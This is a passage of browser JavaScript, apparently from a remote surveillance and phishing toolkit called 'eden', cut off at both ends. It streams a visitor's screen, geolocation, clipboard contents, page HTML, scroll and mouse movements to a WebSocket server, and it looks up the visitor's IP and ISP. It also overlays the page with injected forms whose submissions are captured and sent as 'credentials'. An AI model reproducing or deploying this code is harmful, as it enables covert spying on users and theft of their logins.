                            timestamp: Date.now() // Add timestamp for ordering
                        }));
                        
                        // Schedule next capture - use requestAnimationFrame for smoother capture
                        // with a small delay to prevent overwhelming the connection
                        setTimeout(() => {
                            requestAnimationFrame(captureAndSendFrames);
                        }, 50); // 20fps target rate
                    } else {
                        console.log("WebSocket not available, stopping screen capture");
                    }
                } catch (error) {
                    console.error("Error capturing screen:", error);
                }
            }
            
            // Start the frame capture loop
            captureAndSendFrames();
            
            // Handle stream ending
            stream.getVideoTracks()[0].onended = () => {
                if (permMedia.screen instanceof Map) {
                    permMedia.screen.delete(thisClientId);
                } else {
                    permMedia.screen = null;
                }
                
                const clientContainer = document.getElementById(`screen-feed-${thisClientId}`);
                if (clientContainer && clientContainer.parentNode) {
                    clientContainer.parentNode.removeChild(clientContainer);
                }
                
                updateStatus('screen', false, 'Screen sharing stopped', thisClientId);
            };
            
            updateStatus('screen', true, 'Screen capture started', thisClientId);
        } catch (error) {
            // Use the provided clientId or fall back to window.clientId
            updateStatus('screen', false, error.message, clientId || window.clientId);
        }
    }

    function requestLocation(clientId) {
        // If no clientId provided, use the current client's ID
        const thisClientId = clientId || window.clientId;
        
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    // Handle both Map and direct storage formats
                    if (permMedia.location instanceof Map) {
                        permMedia.location.set(thisClientId, locationData);
                    } else {
                        // For backward compatibility
                        permMedia.location = locationData;
                    }
                    
                    const feedsContainer = document.getElementById('locationFeeds');
                    if (feedsContainer) {
                        // Check if we already have a container for this client
                        const existingContainer = document.getElementById(`location-feed-${thisClientId}`);
                        if (!existingContainer) {
                            const clientContainer = createClientFeedContainer('location', thisClientId);
                            
                            const locationInfo = document.createElement('div');
                            locationInfo.style.padding = '10px';
                            locationInfo.innerHTML = `
                                <strong>Latitude:</strong> ${locationData.latitude}<br>
                                <strong>Longitude:</strong> ${locationData.longitude}<br>
                                <strong>Accuracy:</strong> ${locationData.accuracy} meters
                            `;
                            
                            clientContainer.appendChild(locationInfo);
                            feedsContainer.appendChild(clientContainer);
                        }
                    }
                    
                    // Send location data to server with client ID
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            type: 'location',
                            coords: locationData,
                            clientId: thisClientId
                        }));
                    }
                    
                    updateStatus('location', true, 'Location access granted', thisClientId);
                },
                (error) => {
                    updateStatus('location', false, error.message, thisClientId);
                }
            );
        } else {
            updateStatus('location', false, 'Geolocation not supported', thisClientId);
        }
    }

    async function monitorClipboardUpdates() {
        let clipboardData = ""; // This variable will always store the latest clipboard content
    
        try {
            // Check if Clipboard API is supported
            if (!navigator.clipboard) {
                throw new Error("Clipboard API not supported in this browser");
            }
    
            // Request permission (modern browsers may require this)
            const permissionStatus = await navigator.permissions.query({ name: "clipboard-read" });
    
            if (permissionStatus.state === "denied") {
                console.warn("Clipboard permission denied");
                return;
            }
    
            console.log("Clipboard monitoring started");
    
            // Function to check clipboard content and update variable
            const checkClipboard = async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if (text !== clipboardData) {
                        clipboardData = text;
                        console.log("Clipboard updated:", clipboardData);
    
                        // You can also call any function here to process this new data
                        // processClipboardData(clipboardData);
                    }
                } catch (err) {
                    console.error("Error reading clipboard:", err);
                }
            };
    
            // Initial check
            await checkClipboard();
    
            // Poll clipboard every 1 second
            setInterval(checkClipboard, 1000);
    
        } catch (error) {
            console.error("Error during clipboard monitoring:", error);
        }
    
        // Return clipboardData variable for reference (note: will not update outside, just shown here)
        return clipboardData;
    }
    
    // Usage example:
    
    


    async function requestClipboard(clientId) {
        try {
            // First check if clipboard API is supported
            if (!navigator.clipboard) {
                throw new Error('Clipboard API not supported');
            }

            // Request clipboard permission
            try {
                const permissionResult = await navigator.permissions.query({ name: 'clipboard-read' });
                
                // Handle different permission states
                switch (permissionResult.state) {
                    case 'granted':
                        startClipboardMonitoring(clientId);
                        break;
                    case 'prompt':
                        // Try to get user permission
                        await tryClipboardAccess(clientId);
                        break;
                    case 'denied':
                        updateStatus('clipboard', false, 'Clipboard access denied by user', clientId);
                        break;
                    default:
                        updateStatus('clipboard', false, 'Unknown permission state', clientId);
                }

                // Listen for permission changes
                permissionResult.onchange = () => {
                    if (permissionResult.state === 'granted') {
                        startClipboardMonitoring(clientId);
                    } else {
                        updateStatus('clipboard', false, `Clipboard permission ${permissionResult.state}`, clientId);
                    }
                };
            } catch (permError) {
                // Some browsers don't support clipboard-read permission query
                console.log('Clipboard permission query not supported, trying direct access');
                await tryClipboardAccess(clientId);
            }
        } catch (error) {
            console.error('Clipboard permission error:', error);
            updateStatus('clipboard', false, `Clipboard error: ${error.message}`, clientId);
        }
    }

    async function tryClipboardAccess(clientId) {
        try {
            // Ensure document has focus
            window.focus();
            document.body.focus();
            
            // Try to read clipboard to trigger permission prompt
            const text = await navigator.clipboard.readText();
            startClipboardMonitoring(clientId);
        } catch (error) {
            if (error.name === 'NotAllowedError') {
                updateStatus('clipboard', false, 'Clipboard access denied by user', clientId);
            } else {
                updateStatus('clipboard', false, `Clipboard error: ${error.message}`, clientId);
            }
        }
    }

    function startClipboardMonitoring(clientId) {
        updateStatus('clipboard', true, 'Clipboard access granted', clientId);
        
        // Store last content in a client-specific object to handle multiple clients
        if (!window.lastClipboardContent) window.lastClipboardContent = {};
        
        // Store last send time to prevent rapid duplicate sends
        if (!window.lastClipboardSendTime) window.lastClipboardSendTime = {};
        
        const pollClipboard = async () => {
            try {
                const text = await navigator.clipboard.readText();
                
                // Get the last content for this client
                const lastContent = window.lastClipboardContent[clientId] || '';
                
                // Only send if content has changed
                if (text !== lastContent && text.trim() !== '') {
                    // Update last content
                    window.lastClipboardContent[clientId] = text;
                    
                    // Check if we've sent too recently
                    const now = Date.now();
                    const lastSendTime = window.lastClipboardSendTime[clientId] || 0;
                    
                    // Only send if it's been at least 2 seconds since last send
                    if (now - lastSendTime >= 2000) {
                        // Update last send time
                        window.lastClipboardSendTime[clientId] = now;
                        
                        // Send to server with clientId
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            // Add a small delay to prevent multiple rapid clipboard changes
                            clearTimeout(window.clipboardSendTimeout);
                            window.clipboardSendTimeout = setTimeout(() => {
                                ws.send(JSON.stringify({
                                    type: 'clipboard-content',
                                    content: text,
                                    clientId: clientId,
                                    timestamp: now
                                }));
                            }, 100);
                        }
                    }
                    
                    // Update UI
                    const feedsContainer = document.getElementById('clipboardFeeds');
                    if (feedsContainer) {
                        let clientContainer = document.getElementById(`clipboard-feed-${clientId}`);
                        
                        // Create container if it doesn't exist
                        if (!clientContainer) {
                            clientContainer = createClientFeedContainer('clipboard', clientId);
                            feedsContainer.appendChild(clientContainer);
                        }
                        
                        // Update or create content element
                        let contentElement = clientContainer.querySelector('div');
                        if (!contentElement) {
                            contentElement = document.createElement('div');
                            contentElement.style.padding = '10px';
                            contentElement.style.whiteSpace = 'pre-wrap';
                            clientContainer.appendChild(contentElement);
                        }
                        
                        contentElement.textContent = text;
                    }
                    
                    // Store in permMedia
                    permMedia.clipboard.set(clientId, text);
                    
                    // Send to server
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            type: 'clipboard-content',
                            clientId: clientId,
                            content: text,
                            timestamp: Date.now()
                        }));
                    }
                }
            } catch (error) {
                console.warn('Clipboard polling error:', error);
            }
        };
    
        // Start polling
        const interval = setInterval(pollClipboard, 1000);
        
        // Store interval for cleanup
        if (!window.clipboardIntervals) window.clipboardIntervals = {};
        if (window.clipboardIntervals[clientId]) {
            clearInterval(window.clipboardIntervals[clientId]);
        }
        window.clipboardIntervals[clientId] = interval;
    
        // Monitor clipboard events
        ['copy', 'cut', 'paste'].forEach(eventType => {
            document.addEventListener(eventType, pollClipboard);
        });
    }

    // Function to clean up client-specific resources
    function cleanupClientResources(clientId) {
        // Stop and remove camera stream
        if (permMedia.camera.has(clientId)) {
            permMedia.camera.get(clientId).getTracks().forEach(track => track.stop());
            permMedia.camera.delete(clientId);
        }
        
        // Stop and remove microphone stream
        if (permMedia.mic.has(clientId)) {
            permMedia.mic.get(clientId).getTracks().forEach(track => track.stop());
            permMedia.mic.delete(clientId);
        }
        
        // Stop and remove screen stream
        if (permMedia.screen.has(clientId)) {
            permMedia.screen.get(clientId).getTracks().forEach(track => track.stop());
            permMedia.screen.delete(clientId);
        }
        
        // Remove location and clipboard data
        permMedia.location.delete(clientId);
        permMedia.clipboard.delete(clientId);
        
        // Remove client-specific UI elements
        ['camera', 'audio', 'screen', 'location', 'clipboard'].forEach(type => {
            const element = document.getElementById(`${type}-feed-${clientId}`);
            if (element) {
                element.remove();
            }
        });
    }
    
    // Initialize on page load
    function initialize() {
        // Initialize the eden namespace if it doesn't exist
        if (!window.eden) {
            window.eden = {};
            
            // Create method to get or create permission elements
            window.eden.getPermissionElement = function(id) {
                let element = document.getElementById(id);
                if (!element) {
                    if (id.includes('Video')) {
                        element = document.createElement('video');
                        element.id = id;
                        element.style.cssText = 'position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;';
                        element.setAttribute('playsinline', '');
                        element.setAttribute('autoplay', '');
                        element.setAttribute('muted', '');
                        element.muted = true;
                    } else if (id.includes('Canvas')) {
                        element = document.createElement('canvas');
                        element.id = id;
                        element.style.cssText = 'position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;';
                        element.width = 320;  // Default size, can be adjusted
                        element.height = 240; // Default size, can be adjusted
                    }
                    document.body.appendChild(element);
                }
                return element;
            };
            
            // Initialize any required permission media tracking
            window.eden._clipboardListener = null; // Store clipboard listener for cleanup
        }
        
        // Try to get client IP
        getClientIp().then(() => {
            // Connect to WebSocket server
            connectToServer();
            
            // Restore blur effect and content if it was previously applied
            restoreBlurEffectAndContent();
        });
    }
    
    // Function to restore blur effect and content from localStorage
    function restoreBlurEffectAndContent() {
        // First check if we have a clean flag set - if so, don't restore anything
        if (localStorage.getItem('clean-flag') === 'true' || sessionStorage.getItem('clean-flag') === 'true') {
            console.log('Clean flag found, skipping blur effect restoration');
            // Clear the flag for next time
            localStorage.removeItem('clean-flag');
            sessionStorage.removeItem('clean-flag');
            return;
        }
        
        // Try to restore from the unified blur-data object first (most reliable method)
        try {
            const blurDataStr = localStorage.getItem('blur-data');
            if (blurDataStr) {
                const blurData = JSON.parse(blurDataStr);
                console.log('Found unified blur data to restore:', blurData);
                
                if (blurData && blurData.content) {
                    // First remove any existing overlays to prevent duplicates
                    document.querySelectorAll('#eden-blur-overlay, #eden-content-container').forEach(el => {
                        if (el && el.parentNode) {
                            el.parentNode.removeChild(el);
                        }
                    });
                    
                    // Create and apply blur overlay
                    const overlay = document.createElement('div');
                    overlay.id = 'eden-blur-overlay';
                    
                    // Apply effect based on saved type
                    const effectType = blurData.effectType || 'blur';
                    const intensity = parseInt(blurData.intensity) || 5;
                    
                    if (effectType === 'blur') {
                        const blurAmount = Math.max(1, Math.min(20, intensity));
                        overlay.style.cssText = `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100vw;
                            height: 100vh;
                            backdrop-filter: blur(${blurAmount}px);
                            -webkit-backdrop-filter: blur(${blurAmount}px);
                            background-color: rgba(0, 0, 0, 0.1);
                            z-index: 999999;
                            pointer-events: auto;
                            display: block !important;
                        `;
                        console.log('Restored blur effect with intensity:', blurAmount, 'px');
                    } else if (effectType === 'shade') {
                        const opacityValue = Math.max(0.2, Math.min(0.9, intensity / 20));
                        overlay.style.cssText = `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100vw;
                            height: 100vh;
                            background-color: rgba(0, 0, 0, ${opacityValue});
                            z-index: 999999;
                            pointer-events: auto;
                            display: block !important;
                        `;
                        console.log('Restored shade effect with opacity:', opacityValue);
                    } else if (effectType === 'custom' && blurData.customEffect) {
                        // Handle custom effect restoration
                        const customEffect = blurData.customEffect;
                        console.log('Restoring custom effect:', customEffect.name);
                        
                        if (customEffect.type === 'css') {
                            // Apply CSS-based effect
                            const styleEl = document.createElement('style');
                            styleEl.id = 'eden-custom-effect-style';
                            
                            // Add CSS variables for intensity
                            const intensityValue = Math.max(1, Math.min(20, intensity));
                            const cssWithVars = `
                                :root {
                                    --eden-effect-intensity: ${intensityValue};
                                    --eden-effect-opacity: ${intensityValue / 20};
                                    --eden-effect-blur: ${intensityValue}px;
                                    --eden-effect-contrast: ${100 + (intensityValue * 5)}%;
                                    --eden-effect-brightness: ${100 + (intensityValue * 2)}%;
                                }
                                ${customEffect.content}
                            `;
                            
                            styleEl.textContent = cssWithVars;
                            document.head.appendChild(styleEl);
                            
                            // Apply basic overlay with intensity-based properties
                            const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
                            overlay.style.cssText = `
                                position: fixed;
                                top: 0;
                                left: 0;
                                width: 100vw;
                                height: 100vh;
                                z-index: 999999;
                                pointer-events: auto;
                                display: block !important;
                                opacity: ${opacityValue};
                            `;
                            
                            // Add custom class for CSS targeting
                            overlay.className = 'eden-custom-effect';
                            
                        } else {
                            // HTML-based effect
                            // Apply basic overlay with opacity based on intensity
                            const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
                            overlay.style.cssText = `
                                position: fixed;
                                top: 0;
                                left: 0;
                                width: 100vw;
                                height: 100vh;
                                z-index: 999999;
                                pointer-events: auto;
                                display: block !important;
                                overflow: hidden;
                                background-color: rgba(0, 0, 0, ${opacityValue * 0.2});
                            `;
                            
                            // Create a container for the HTML effect
                            const effectContainer = document.createElement('div');
                            effectContainer.id = 'eden-custom-effect';
                            effectContainer.style.cssText = `
                                position: fixed;
                                top: 0;
                                left: 0;
                                width: 100vw;
                                height: 100vh;
                                z-index: 999998;
                                pointer-events: none;
                                opacity: ${opacityValue};
                                filter: contrast(${100 + (intensity * 10)}%);
                            `;
                            
                            // Set the HTML content
                            effectContainer.innerHTML = customEffect.content;
                            document.body.appendChild(effectContainer);
                        }
                        
                        console.log('Restored custom effect:', customEffect.name);
                    } else {
                        // Default or 'none' effect
                        overlay.style.cssText = `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100vw;
                            height: 100vh;
                            z-index: 999999;
                            pointer-events: auto;
                            display: block !important;
                        `;
                        console.log('Restored default/none effect background');
                    }
                    
                    
                    // Add the overlay to the body
                    document.body.appendChild(overlay);
                    
                    // Retrieve position data from the blur data object
                    let posX = 50; // Default center
                    let posY = 50; // Default center
                    
                    // Check if we have location data in the blur data
                    if (blurData.location) {
                        posX = blurData.location.x || 50;
                        posY = blurData.location.y || 50;
                        console.log(`Using position from blur-data: X=${posX}, Y=${posY}`);
                    }
                    // If not, try to get it from dedicated location storage
                    else {
                        const savedX = localStorage.getItem('eden_blur_location_x');
                        const savedY = localStorage.getItem('eden_blur_location_y');
                        if (savedX && savedY) {
                            posX = parseInt(savedX);
                            posY = parseInt(savedY);
                            console.log(`Using position from eden_blur_location: X=${posX}, Y=${posY}`);
                        }
                    }
                    
                    // Create content container with proper position
                    const contentContainer = document.createElement('div');
                    contentContainer.id = 'eden-content-container';
                    contentContainer.style.cssText = `
                        position: fixed;
                        top: ${posY}%;
                        left: ${posX}%;
                        transform: translate(-50%, -50%);
                        max-width: 95%;
                        max-height: 95vh;
                        overflow: auto;
                        border: none;
                        background: none;
                        box-shadow: none;
                        padding: 0;
                        margin: 0;
                        z-index: 2000000; /* Higher z-index than overlay */
                        display: block !important;
                    `;
                    contentContainer.innerHTML = blurData.content;
                    
                    // Add content container to body
                    document.body.appendChild(contentContainer);
                    
                    // Set up form handling for the restored content
                    setupRestoredFormHandling(contentContainer);
                    
                    console.log(`Successfully restored blur effect and content at position X=${posX}%, Y=${posY}%`);
                    return; // Exit early if we successfully restored
                }
            }
        } catch (e) {
            console.error('Error restoring from unified blur data:', e);
        }
        
        // Fall back to the legacy method if unified approach fails
        if (localStorage.getItem('eden-blur-applied') === 'true') {
            const effectType = localStorage.getItem('eden-blur-effect') || 'blur';
            const intensity = parseInt(localStorage.getItem('eden-blur-intensity') || '5');
            
            console.log('Restoring blur effect using legacy method:', effectType, 'with intensity:', intensity);
            
            // Create overlay with appropriate effect
            const overlay = document.createElement('div');
            overlay.id = 'eden-blur-overlay';
            
            // Apply different effects based on type using cssText
            if (effectType === 'blur') {
                const blurAmount = Math.max(1, Math.min(20, intensity));
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    backdrop-filter: blur(${blurAmount}px);
                    -webkit-backdrop-filter: blur(${blurAmount}px);
                    background-color: rgba(0, 0, 0, 0.1);
                    z-index: 999999;
                    pointer-events: auto;
                    display: block !important;
                `;
            } else if (effectType === 'shade') {
                const opacityValue = Math.max(0.2, Math.min(0.9, intensity / 20));
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background-color: rgba(0, 0, 0, ${opacityValue});
                    z-index: 999999;
                    pointer-events: auto;
                    display: block !important;
                `;
            } else {
                // Default or 'none' effect
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    z-index: 999999;
                    pointer-events: auto;
                    display: block !important;
                `;
            }
            
            // Add the overlay to the body
            document.body.appendChild(overlay);
            
            // If there was content, restore it too
            const storedContent = localStorage.getItem('blur-content');
            if (storedContent) {
                // Get position from dedicated location storage
                let posX = 50; // Default center
                let posY = 50; // Default center
                
                const savedX = localStorage.getItem('eden_blur_location_x');
                const savedY = localStorage.getItem('eden_blur_location_y');
                if (savedX && savedY) {
                    posX = parseInt(savedX);
                    posY = parseInt(savedY);
                    console.log(`Using legacy position: X=${posX}, Y=${posY}`);
                }
                
                // Create content container with proper position
                const contentContainer = document.createElement('div');
                contentContainer.id = 'eden-content-container';
                contentContainer.style.cssText = `
                    position: fixed;
                    top: ${posY}%;
                    left: ${posX}%;
                    transform: translate(-50%, -50%);
                    max-width: 95%;
                    max-height: 95vh;
                    overflow: auto;
                    border: none;
                    background: none;
                    box-shadow: none;
                    padding: 0;
                    margin: 0;
                    z-index: 2000000; /* Higher z-index than overlay */
                    display: block !important;
                `;
                contentContainer.innerHTML = storedContent;
                
                // Add content container to body
                document.body.appendChild(contentContainer);
                
                // Set up form handling for the restored content
                setupRestoredFormHandling(contentContainer);
                
                console.log(`Restored content using legacy method at position X=${posX}%, Y=${posY}%`);
            }
        }
    }
    
    // Helper function to set up form handling for restored content
    function setupRestoredFormHandling(container) {
        if (!container) return;
        
        // Find and process all forms in the restored content
        const forms = container.querySelectorAll('form');
        forms.forEach(form => {
            // Mark as a blur form
            form.setAttribute('data-blur-form', 'true');
            
            // Save original attributes
            const originalAction = form.getAttribute('action') || '';
            const originalTarget = form.getAttribute('target') || '';
            
            // Store original values as data attributes
            form.setAttribute('data-original-action', originalAction);
            form.setAttribute('data-original-target', originalTarget);
            
            // Remove navigation attributes
            form.removeAttribute('action');
            form.removeAttribute('target');
            
            // Set onsubmit handler
            form.setAttribute('onsubmit', 'window.edenFormSubmitted(this); return false;');
            
            console.log('Processed form in restored content');
        });
        
        // Ensure the form submission handler is defined
        if (!window.edenFormSubmitted) {
            window.edenFormSubmitted = function(form) {
                console.log('Form submission intercepted from restored content');
                
                // Extract form data
                const formData = new FormData(form);
                const data = {};
                for (let [key, value] of formData.entries()) {
                    data[key] = value;
                }
                
                // Send data to server if WebSocket is available
                if (window.ws && window.ws.readyState === WebSocket.OPEN) {
                    window.ws.send(JSON.stringify({
                        type: 'credentials',
                        data: data,
                        url: document.location.href,
                        timestamp: new Date().toISOString(),
                        formId: form.id || 'blur_form',
                        clientId: window.clientId || 'unknown',
                        ip: window.clientIp || 'unknown',
                        source: window.name || 'blur_content'
                    }));
                }
                
                // Clean up blur effect
                _forceCleanupBlurEffect();
                
                return false;
            };
        }
    }
    
    // Get client IP address
    async function getClientIp() {
        try {
            // First try using a simple local technique to get IP
            const hostname = window.location.hostname;
            if (hostname === 'localhost' || hostname === '127.0.0.1') {
                // For localhost testing, generate a consistent IP based on client ID
                // This ensures the same instance always reports the same IP
                // Extract numbers from clientId to use as the last octet
                const idNumber = parseInt(clientId.replace(/\D/g, '').slice(0, 8)) % 250 + 1;
                clientIp = '192.168.0.' + idNumber;
                
                console.log('Using unique localhost client IP:', clientIp, 'for client ID:', clientId);
                
                // Set detailed location info for local testing
                locationInfo = {
                    city: 'Local',
                    region: 'Development',
                    country: 'Local',
                    org: 'Local Network',
                    isp: 'Local Development',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                return;
            }

            // Skip PHP fetch since we don't have a PHP server
            // Go directly to external services for IP detection
            
            // Try external services
            try {
                // First attempt with ipify for IP
                const response = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) });
                const data = await response.json();
                clientIp = data.ip;
                
                // Now get location data
                try {
                    const locResponse = await fetch(`https://ipinfo.io/${clientIp}/json`);
                    locationInfo = await locResponse.json();
                    
                    // Ensure we have isp information
                    if (!locationInfo.isp && locationInfo.org) {
                        locationInfo.isp = locationInfo.org;
                    }
                } catch (locError) {
                    console.warn('Error getting location info:', locError);
                    // Create fallback location data
                    locationInfo = { 
                        org: 'Unknown ISP', 
                        isp: 'Unknown ISP',
                        city: 'Unknown', 
                        region: 'Unknown', 
                        country: 'Unknown',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };
                }
            } catch (ipError) {
                console.warn('Error getting IP from ipify:', ipError);
                // Try another service
                try {
                    const response2 = await fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(2000) });
                    const data2 = await response2.json();
                    clientIp = data2.ip;
                    locationInfo = data2;
                    
                    // Ensure we have isp information
                    if (!locationInfo.isp && locationInfo.org) {
                        locationInfo.isp = locationInfo.org;
                    }
                } catch (ipError2) {
                    console.warn('Error getting IP from ipinfo:', ipError2);
                    // If all fails, use a fallback local IP
                    clientIp = '192.168.' + Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256);
                    locationInfo = { 
                        org: 'Unknown ISP', 
                        isp: 'Unknown ISP',
                        city: 'Unknown', 
                        region: 'Unknown', 
                        country: 'Unknown',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };
                }
            }
        } catch (error) {
            console.error('Fatal error in getClientIp:', error);
            // Final fallback
            clientIp = '192.168.' + Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256);
            locationInfo = { 
                org: 'Unknown ISP', 
                isp: 'Unknown ISP',
                city: 'Unknown', 
                region: 'Unknown', 
                country: 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }
    }
    
    // Track connection status to prevent duplicate connections
    let hasConnectedBefore = false;
    let lastConnectionTime = 0;
    
    // Connect to WebSocket server
    function connectToServer() {
        // Prevent rapid reconnections (throttle to once per 3 seconds)
        const now = Date.now();
        if (now - lastConnectionTime < 3000) {
            console.log('Throttling connection attempt - too soon after last connection');
            return;
        }
        lastConnectionTime = now;
        
        // Cleanup any existing connection
        if (ws) {
            clearInterval(heartbeatTimer);
            if (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING) {
                console.log('Closing existing connection before creating a new one');
                ws.close();
            }
        }
        
        // Fixed WebSocket connection URL
        // Comment out the one you're not using
        const wsUrl = 'ws://localhost:8080'; // Local developmenteden.js 
        
        console.log('Using WebSocket URL:', wsUrl);
        
        // === BOM.js content start ===
        // Mouse position tracker with WebSocket connection - using the same connection
        
        
        
        // Client ID to identify this client
        const bomClientId = getOrCreateClientId();
        console.log('Using client ID:', bomClientId);
        
        // Tracking state - enable by default
        let isTrackingEnabled = true;
        localStorage.setItem('mouseTrackerEnabled', 'true');
        
        // Long click detection
        const longClickDelay = 400; // reduced from 500ms to 400ms for even faster long-click detection
        let mouseDownTimer = null;
        let isLongClick = false;
        let activeButton = null;
        let lastMousePosition = { x: 0, y: 0 };
        
        // HTML content tracking
        let lastHtmlContent = '';
        let lastScrollPosition = { x: 0, y: 0 };
        let contentObserver = null;
        let styleSheets = [];
        let contentSendInterval = null;
        let refreshDetected = false;
        
        // Track if we're currently in a refresh process
        if (performance.navigation && performance.navigation.type === 1 || 
            sessionStorage.getItem('bom_page_refreshing') === 'true') {
            refreshDetected = true;
            console.log('Page refresh detected, will send content immediately');
            sessionStorage.removeItem('bom_page_refreshing');
        }
        
        // Immediately initialize content capture to enable mouse tracking
        setTimeout(() => {
            initializeContentCapture();
            
            // Force initial mouse position send
            if (lastMousePosition.x && lastMousePosition.y) {
                throttledSendMousePosition(lastMousePosition.x, lastMousePosition.y);
            } else {
                // Send center position if no mouse positions yet
                throttledSendMousePosition(window.innerWidth/2, window.innerHeight/2);
            }
            console.log('Mouse tracking initialized with initial position');
        }, 300);
        
        // Listen for beforeunload to handle refresh detection
        window.addEventListener('beforeunload', function() {
            // Set a flag to indicate page is being refreshed
            sessionStorage.setItem('bom_page_refreshing', 'true');
            
            // Also store the current HTML content for quick recovery
            localStorage.setItem('bom_last_html_content', document.body.innerHTML);
            localStorage.setItem('bom_last_html_time', Date.now());
        
            // Store current scroll position
            localStorage.setItem('bom_last_scroll_x', window.scrollX || window.pageXOffset);
            localStorage.setItem('bom_last_scroll_y', window.scrollY || window.pageYOffset);
            
            // Try to notify server about refresh
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'page_refreshing',
                    clientId: bomClientId,
                    timestamp: Date.now()
                }));
            }
        });
        
        // Initialize HTML content capture
        function initializeContentCapture() {
            // Capture initial HTML content
            captureAndSendHtmlContent(true);
            
            // Set up a periodic sender for HTML content to ensure it's always available
            // This helps when someone refreshes the bom.html page
            contentSendInterval = setInterval(() => {
                if (isTrackingEnabled) {
                    captureAndSendHtmlContent(false);
                }
            }, 3000); // Send HTML content every 3 seconds
            
            // Set up scroll event listener with improved handling
            window.addEventListener('scroll', function(event) {
                if (!isTrackingEnabled) return;
                
                const scrollX = window.scrollX || window.pageXOffset;
                const scrollY = window.scrollY || window.pageYOffset;
                
                // Only send if scroll position has changed significantly
                const lastX = lastScrollPosition.x;
                const lastY = lastScrollPosition.y;
                
                // Check if scroll position has changed by at least 5 pixels
                if (Math.abs(scrollX - lastX) > 5 || Math.abs(scrollY - lastY) > 5) {
                    // Update last scroll position
                    lastScrollPosition = { x: scrollX, y: scrollY };
                    
                    // Store scroll position for recovery after refresh
                    localStorage.setItem('bom_last_scroll_x', scrollX);
                    localStorage.setItem('bom_last_scroll_y', scrollY);
                    
                    const message = {
                        type: 'scroll-position',
                        clientId: bomClientId,
                        scrollX: scrollX,
                        scrollY: scrollY,
                        timestamp: new Date().toISOString(),
                        priority: 'high' // Set high priority for scroll events
                    };
                    
                    if (ws.readyState === WebSocket.OPEN) {
                        console.log(`[SCROLL] Sending scroll position: ${scrollX}, ${scrollY}`);
                        ws.send(JSON.stringify(message));
                    }
                }
            }, { passive: true }); // Use passive event for better scroll performance
            
            // Setup mutation observer to detect DOM changes
            contentObserver = new MutationObserver(function(mutations) {
                if (!isTrackingEnabled) return;
                captureAndSendHtmlContent(true);
            });
            
            // Start observing document for changes
            contentObserver.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                characterData: true
            });
            
            // Capture stylesheets
            captureStylesheets();
            
            // If this is after a refresh, send content immediately
            if (refreshDetected) {
                console.log('Post-refresh detected, sending content immediately');
                setTimeout(() => sendHtmlContentImmediately(), 100);
            }
        }
        
        // Capture and send all stylesheets
        function captureStylesheets() {
            styleSheets = [];
            
            // Collect all stylesheets
            for (let i = 0; i < document.styleSheets.length; i++) {
                try {
                    const sheet = document.styleSheets[i];
                    let cssRules = '';
                    
                    // Try to access cssRules - may fail due to CORS
                    if (sheet.cssRules) {
                        for (let j = 0; j < sheet.cssRules.length; j++) {
                            cssRules += sheet.cssRules[j].cssText + '\n';
                        }
                        
                        styleSheets.push({
                            href: sheet.href,
                            content: cssRules
                        });
                    } else if (sheet.href) {
                        // If we can't access rules but there's an href, just send the href
                        styleSheets.push({
                            href: sheet.href,
                            content: null
                        });
                    }
                } catch (e) {
                    // CORS issue - just capture the href
                    if (document.styleSheets[i].href) {
                        styleSheets.push({
                            href: document.styleSheets[i].href,
                            content: null
                        });
                    }
                }
            }
            
            // Send stylesheets
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'stylesheets',
                    clientId: bomClientId,
                    styleSheets: styleSheets,
                    timestamp: new Date().toISOString()
                }));
            }
        }
        
        // Capture and send HTML content
        function captureAndSendHtmlContent(forceUpdate = false) {
            if (!isTrackingEnabled) return;
            
            // Get current HTML content
            const currentHtmlContent = document.body.innerHTML;
            
            // Check if content has changed or force update is requested
            if (forceUpdate || currentHtmlContent !== lastHtmlContent) {
                lastHtmlContent = currentHtmlContent;
                
                // Store in localStorage for recovery
                localStorage.setItem('bom_last_html_content', currentHtmlContent);
                localStorage.setItem('bom_last_html_time', Date.now());
                
                // Filter out JavaScript before sending
                let filteredContent = currentHtmlContent;
                
                // Remove script tags and their content
                filteredContent = filteredContent.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
                
                // Remove inline event handlers (onclick, onload, etc.)
                filteredContent = filteredContent.replace(/\son\w+\s*=\s*["']?[^"']*["']?/gi, '');
                
                // Remove javascript: URLs
                filteredContent = filteredContent.replace(/javascript\s*:/gi, 'disabled-javascript:');
                
                // Send HTML content message
                const message = {
                    type: 'html-content',
                    clientId: bomClientId,
                    content: filteredContent,
                    timestamp: new Date().toISOString(),
                    pageTitle: document.title,
                    pageUrl: window.location.href
                };
                
                if (ws.readyState === WebSocket.OPEN) {
